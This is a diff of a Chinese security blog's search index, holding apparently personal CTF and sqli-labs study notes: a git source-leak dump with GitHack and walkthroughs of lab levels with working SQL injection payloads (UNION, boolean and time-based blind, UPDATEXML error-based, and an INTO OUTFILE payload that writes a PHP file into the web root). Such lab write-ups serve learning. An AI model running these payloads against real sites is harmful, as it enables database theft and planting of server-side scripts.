@@ -1,6 +1,23 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUUCTF[BJDCTF2020]Mark loves cat</title>
+    <url>/2020/09/20/BUUCTF-BJDCTF2020-Mark-loves-cat/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><a id="more"></a>
+<p>一开局看样子可能是已知cms的漏洞的利用<br><img src="https://i.loli.net/2020/09/20/ckrmQGbNgTolFi3.png" alt="image.png"><br>开始扫一波后台试试<br>没扫到后台，但是发现一个挺有趣的东西<br><img src="https://i.loli.net/2020/09/20/8WkrtnuKzvGDwaU.png" alt="image.png"><br>git源码泄露</p>
+<p>这时候就要祭出githack了<br><code>python GitHack.py http://Domain/.git/</code></p>
+<p>接下来就是代码审计了<br>这无能为力，只能去看看大牛们之前的wp</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>渗透</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF[SUCTF 2019]EasySQL</title>
     <url>/2020/09/17/BUUCTF-SUCTF-2019-EasySQL/</url>
     <content><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><a id="more"></a>
@@ -25,23 +42,6 @@
 <p>我还是太菜了，害</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> $_GET[<span class="string">&#x27;query&#x27;</span>] <span class="operator">||</span> flag <span class="keyword">from</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>当然，这里还可以直接<code>*,1</code>爆出flag（网上大佬说是没有过滤</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-        <tag>渗透</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF[BJDCTF2020]Mark loves cat</title>
-    <url>/2020/09/20/BUUCTF-BJDCTF2020-Mark-loves-cat/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><a id="more"></a>
-<p>一开局看样子可能是已知cms的漏洞的利用<br><img src="https://i.loli.net/2020/09/20/ckrmQGbNgTolFi3.png" alt="image.png"><br>开始扫一波后台试试<br>没扫到后台，但是发现一个挺有趣的东西<br><img src="https://i.loli.net/2020/09/20/8WkrtnuKzvGDwaU.png" alt="image.png"><br>git源码泄露</p>
-<p>这时候就要祭出githack了<br><code>python GitHack.py http://Domain/.git/</code></p>
-<p>接下来就是代码审计了<br>这无能为力，只能去看看大牛们之前的wp</p>
 ]]></content>
       <categories>
         <category>学习笔记</category>
@@ -253,6 +253,107 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-lab Less 1-Less 10</title>
+    <url>/2020/08/09/sqli-lab-Less-1-Less-10/</url>
+    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-1-Less-10"><a href="#Sqli-lab-过关笔记-Less-1-Less-10" class="headerlink" title="Sqli-lab 过关笔记 Less 1-Less 10"></a>Sqli-lab 过关笔记 Less 1-Less 10</h1><a id="more"></a>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>首先加单引号查看其报错信息</p>
+<p><code>&#39;1&#39;&#39; LIMIT 0,1</code></p>
+<p>根据报错的语句可以推测大概sql的查询语句是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>可见是单引号闭合的查询语句，由此就可以构造注入的语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; UNION SELECT 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
+<p>便可以进行下一步注入</p>
+<hr>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>加单引号显示报错 </p>
+<p> <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>而sql语句的报错信息是  <code>\&#39; LIMIT 0,1</code><br>人为用”&quot;告诉编译器换行<br>而一般的查询语句大致就是  </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>输入<code>&#39;</code>后出现语法错误报错使语句变成</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">USER</span> <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line"><span class="string">&#x27;LIMIT 0,1 #单引号未被闭合</span></span><br></pre></td></tr></table></figure>
+<p>所以后加入注释<code>#</code>或<code>--+</code>或<code>--%20</code>后</p>
+<p>则返回正常，此时语句是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> USERNAME,PASSWD <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line"># LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>而后面知道了出现<code>\</code>，这是php自动开了<code>&#39;</code> 的转义，具体怎么关闭可以看我的另一篇笔记</p>
+<hr>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>加单引号后报错信息是<br><code>&#39;1&#39;&#39;) LIMIT 0,1</code></p>
+<p>去掉一个单引号后变成<br><code>&#39;1&#39;) LIMIT 0,1</code></p>
+<p>可以推测是由小括号闭合的查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USRES <span class="keyword">WHERE</span> ID <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合单引号加括号后连接注入语句，成功回显</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;) union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>加单引号，括号皆返回正常<br>加双引号后爆出错误<br><code>&quot;1&quot;&quot;) LIMIT 0,1</code></p>
+<p>去掉一个双引号<br><code>&quot;1&quot;) LIMIT 0,1</code></p>
+<p>可以推测这是由双引号和括号闭合的查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> (&quot;id&quot;) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合语句后插入注入语句,成功回显</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span>&quot;) UNION SELECT 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>开局就是<code>You are in ...</code><br>这是盲注关卡了，首先单引号探路<br><code>&#39;1&#39;&#39; LIMIT 0,1</code><br>去掉一个单引号后可以推知查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>之后闭合语句注入，回显正常结果为true</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure>
+<p>验证成功，扔Sqlmap</p>
+<hr>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>加上单引号小括号没反应，双引号报错</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;1&quot;&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>去掉一个双引号可推知查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> &quot;id&quot; LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合语句后插入注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND LENGTH(DATABASE())=8 --+</span><br></pre></td></tr></table></figure>
+<p>验证成功，扔sqlmap</p>
+<hr>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>单引号探路扔出错误<br><code>You have an error in your SQL syntax</code><br>扔出双引号单括号回显正常</p>
+<p>用<code>&#39; --+</code>试图闭合爆出<br><code>You have an error in your SQL syntax</code></p>
+<p>用<code>&#39;) --+</code>试图闭合爆出<br><code>You have an error in your SQL syntax</code></p>
+<p>用<code>&#39;)) --+</code> 回显正常，闭合成功</p>
+<p>由此可以推知查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> ((<span class="string">&#x27;id&#x27;</span>)) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合引号验证</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND LENGTH(DATABASE())=8 --+</span></span><br></pre></td></tr></table></figure>
+<p>回显正常</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND ASCII(SUBSTR(DATABASE(),1,1)))=116 --+</span></span><br></pre></td></tr></table></figure>
+<p>这样猜解又错误</p>
+<p>然后突然注意到一直被忽略的标题<br><code>Dump into outfile</code><br>原来这才是考察的内容</p>
+<p>然后查了一下mysql outfile的相关内容<br>发现是一个导出查询内容文件的函数，于是去构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&#x27;</span><span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span><span class="string">&#x27;,3 into outfile &#x27;</span>C:\\phpStudy2016\\WWW\\sqli\\Less<span class="number">-7</span>\\<span class="number">1.</span>php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p>这里写文件的话需要</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">root以及更高权限</span><br><span class="line">secure_file_priy不为<span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">set</span> globle general_log <span class="operator">=</span> <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
+<p>后才可以正常写入</p>
+<hr>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>日常单引号开路无回显，双引号小括号均正常<br>闭合单引号后正常，即可推知查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>构造闭合语句注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(DATABASE()) &gt; 0 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">AND</span> SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>回显正常，验证成功，扔sqlmap</p>
+<hr>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>常规单引号探测，发现无论是单引号双引号还是小括号都回显正常</p>
+<p>在单引号后接<code>AND 1=2 --+</code>，双引号小括号同上都返回正常<br>说明不是bool型盲注</p>
+<p>用<code>AND SLEEP(5) --+</code>接在后探测<br>发现只有单引号触发SLEEP效果由此可推测查询语句是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>由此可闭合构造语句验证</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span></span><br></pre></td></tr></table></figure>
+<p>延时成功验证，扔sqlmap</p>
+<hr>
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>同样是对闭合方法进行测试<br>直接回显正常，bool方法回显正常<br>则构造sleep进行验证</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND SLEEP(2) --+</span><br></pre></td></tr></table></figure>
+<p>成功延时，可推测查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span>&quot;id&quot;</span><br></pre></td></tr></table></figure>
+<p>进行闭合后插入注入验证</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span><br></pre></td></tr></table></figure>
+<p>验证成功，扔sqlmap</p>
+<hr>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>渗透</tag>
+        <tag>sqli-lab</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-lab Less 11-Less 22</title>
     <url>/2020/08/30/sqli-lab-Less-11-Less-22/</url>
     <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-11-Less-22"><a href="#Sqli-lab-过关笔记-Less-11-Less-22" class="headerlink" title="Sqli-lab 过关笔记 Less 11-Less 22"></a>Sqli-lab 过关笔记 Less 11-Less 22</h1><a id="more"></a>
@@ -374,107 +475,6 @@
 <p>失败<br>换个闭合方式</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">IiBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICIxIj0iMQ<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
 <p>爆出<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>嘻嘻，成功</p>
-<hr>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-        <tag>渗透</tag>
-        <tag>sqli-lab</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab Less 1-Less 10</title>
-    <url>/2020/08/09/sqli-lab-Less-1-Less-10/</url>
-    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-1-Less-10"><a href="#Sqli-lab-过关笔记-Less-1-Less-10" class="headerlink" title="Sqli-lab 过关笔记 Less 1-Less 10"></a>Sqli-lab 过关笔记 Less 1-Less 10</h1><a id="more"></a>
-<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>首先加单引号查看其报错信息</p>
-<p><code>&#39;1&#39;&#39; LIMIT 0,1</code></p>
-<p>根据报错的语句可以推测大概sql的查询语句是</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>可见是单引号闭合的查询语句，由此就可以构造注入的语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; UNION SELECT 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
-<p>便可以进行下一步注入</p>
-<hr>
-<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>加单引号显示报错 </p>
-<p> <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\&#39; LIMIT 0,1&#39; at line 1</code></p>
-<p>而sql语句的报错信息是  <code>\&#39; LIMIT 0,1</code><br>人为用”&quot;告诉编译器换行<br>而一般的查询语句大致就是  </p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>输入<code>&#39;</code>后出现语法错误报错使语句变成</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">USER</span> <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line"><span class="string">&#x27;LIMIT 0,1 #单引号未被闭合</span></span><br></pre></td></tr></table></figure>
-<p>所以后加入注释<code>#</code>或<code>--+</code>或<code>--%20</code>后</p>
-<p>则返回正常，此时语句是</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> USERNAME,PASSWD <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line"># LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>而后面知道了出现<code>\</code>，这是php自动开了<code>&#39;</code> 的转义，具体怎么关闭可以看我的另一篇笔记</p>
-<hr>
-<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>加单引号后报错信息是<br><code>&#39;1&#39;&#39;) LIMIT 0,1</code></p>
-<p>去掉一个单引号后变成<br><code>&#39;1&#39;) LIMIT 0,1</code></p>
-<p>可以推测是由小括号闭合的查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USRES <span class="keyword">WHERE</span> ID <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>闭合单引号加括号后连接注入语句，成功回显</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;) union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>加单引号，括号皆返回正常<br>加双引号后爆出错误<br><code>&quot;1&quot;&quot;) LIMIT 0,1</code></p>
-<p>去掉一个双引号<br><code>&quot;1&quot;) LIMIT 0,1</code></p>
-<p>可以推测这是由双引号和括号闭合的查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> (&quot;id&quot;) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>闭合语句后插入注入语句,成功回显</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span>&quot;) UNION SELECT 1,database(),3 --+</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>开局就是<code>You are in ...</code><br>这是盲注关卡了，首先单引号探路<br><code>&#39;1&#39;&#39; LIMIT 0,1</code><br>去掉一个单引号后可以推知查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>之后闭合语句注入，回显正常结果为true</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure>
-<p>验证成功，扔Sqlmap</p>
-<hr>
-<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>加上单引号小括号没反应，双引号报错</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;1&quot;&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>去掉一个双引号可推知查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> &quot;id&quot; LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>闭合语句后插入注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND LENGTH(DATABASE())=8 --+</span><br></pre></td></tr></table></figure>
-<p>验证成功，扔sqlmap</p>
-<hr>
-<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>单引号探路扔出错误<br><code>You have an error in your SQL syntax</code><br>扔出双引号单括号回显正常</p>
-<p>用<code>&#39; --+</code>试图闭合爆出<br><code>You have an error in your SQL syntax</code></p>
-<p>用<code>&#39;) --+</code>试图闭合爆出<br><code>You have an error in your SQL syntax</code></p>
-<p>用<code>&#39;)) --+</code> 回显正常，闭合成功</p>
-<p>由此可以推知查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> ((<span class="string">&#x27;id&#x27;</span>)) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>闭合引号验证</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND LENGTH(DATABASE())=8 --+</span></span><br></pre></td></tr></table></figure>
-<p>回显正常</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND ASCII(SUBSTR(DATABASE(),1,1)))=116 --+</span></span><br></pre></td></tr></table></figure>
-<p>这样猜解又错误</p>
-<p>然后突然注意到一直被忽略的标题<br><code>Dump into outfile</code><br>原来这才是考察的内容</p>
-<p>然后查了一下mysql outfile的相关内容<br>发现是一个导出查询内容文件的函数，于是去构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&#x27;</span><span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span><span class="string">&#x27;,3 into outfile &#x27;</span>C:\\phpStudy2016\\WWW\\sqli\\Less<span class="number">-7</span>\\<span class="number">1.</span>php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
-<p>这里写文件的话需要</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">root以及更高权限</span><br><span class="line">secure_file_priy不为<span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">set</span> globle general_log <span class="operator">=</span> <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
-<p>后才可以正常写入</p>
-<hr>
-<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>日常单引号开路无回显，双引号小括号均正常<br>闭合单引号后正常，即可推知查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>构造闭合语句注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(DATABASE()) &gt; 0 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">AND</span> SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p>回显正常，验证成功，扔sqlmap</p>
-<hr>
-<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>常规单引号探测，发现无论是单引号双引号还是小括号都回显正常</p>
-<p>在单引号后接<code>AND 1=2 --+</code>，双引号小括号同上都返回正常<br>说明不是bool型盲注</p>
-<p>用<code>AND SLEEP(5) --+</code>接在后探测<br>发现只有单引号触发SLEEP效果由此可推测查询语句是</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>由此可闭合构造语句验证</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span></span><br></pre></td></tr></table></figure>
-<p>延时成功验证，扔sqlmap</p>
-<hr>
-<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>同样是对闭合方法进行测试<br>直接回显正常，bool方法回显正常<br>则构造sleep进行验证</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND SLEEP(2) --+</span><br></pre></td></tr></table></figure>
-<p>成功延时，可推测查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span>&quot;id&quot;</span><br></pre></td></tr></table></figure>
-<p>进行闭合后插入注入验证</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span><br></pre></td></tr></table></figure>
-<p>验证成功，扔sqlmap</p>
 <hr>
 ]]></content>
       <categories>
